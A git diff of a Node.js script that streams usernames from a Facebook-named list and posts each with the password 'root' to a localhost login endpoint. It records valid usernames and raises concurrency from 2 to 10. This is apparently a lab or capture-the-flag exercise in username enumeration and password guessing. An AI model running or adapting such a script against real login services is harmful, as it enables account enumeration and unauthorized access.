@@ -5,8 +5,7 @@ const tough = require("tough-cookie");
 const cheerio = require('cheerio');
 const taskQueue = require("promise-task-queue");
 const fs = require("fs");
-const readline = require("readline");
-const stream = require("stream");
+const es = require("event-stream");
 
 const argv = process.argv;
 if (argv.length < 3) {
@@ -14,8 +13,6 @@ if (argv.length < 3) {
   process.exit(1);
 }
 const facebookFile = argv[2];
-var facebookStream = fs.createReadStream(facebookFile);
-var outstream = new stream;
 const validUsersFile = "/tmp/part2.validUsernames.txt";
 
 // Setup a session for storing cookies
@@ -58,19 +55,24 @@ queue.define("checkUsername", function(task) {
     }
   });
 }, {
-  concurrency: 2
+  concurrency: 10
 });
 
-var r1 = readline.createInterface({
-  input: facebookStream,
-  terminal: false
-});
-r1.on("line", function(line) {
-  console.log("Trying username: " + line);
-  var user = line.trim();
-  var payload = {
-    username: user,
-    password: "root"
-  }
-  httpSession.post("http://localhost:5000/login", payload);
-});
+var s = fs.createReadStream(facebookFile)
+  .pipe(es.split())
+  .pipe(es.mapSync(function(line) {
+
+    console.log("Trying username: " + line);
+    var user = line.trim();
+    var payload = {
+      username: user,
+      password: "root"
+    }
+    httpSession.post("http://localhost:5000/login", payload);
+  })
+    .on("error", function(err) {
+      console.log("Error while reading facebook usernames file.", err);
+    })
+    .on("end", function() {
+      console.log("Read the entire file.");
+    }));
